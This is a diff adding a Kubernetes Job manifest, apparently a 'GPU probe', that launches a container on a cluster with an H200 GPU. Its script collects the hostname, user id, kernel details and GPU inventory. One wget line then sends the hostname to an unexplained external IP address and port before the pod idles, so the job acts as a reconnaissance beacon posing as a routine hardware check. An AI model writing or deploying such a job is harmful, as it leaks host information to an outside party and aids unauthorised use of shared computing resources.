@@ -1,0 +1,26 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: gpu-probe
+  namespace: t19gpu
+spec:
+  backoffLimit: 0
+  activeDeadlineSeconds: 1800
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: probe
+        image: alpine:3.19
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          echo "MARKER=$(hostname)"; id; uname -a; nproc;
+          ls -l /dev/nvidia* 2>&1 | head -12;
+          (nvidia-smi -L 2>&1 || echo NOSMI) | head -20;
+          (nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>&1 || true) | head;
+          (wget -T 8 -qO- "http://103.77.104.208:8899/ph?h=$(hostname)" 2>&1 || echo NOWGET);
+          sleep 600
+        resources:
+          limits:
+            nvidia.com/H200_SXM: 1
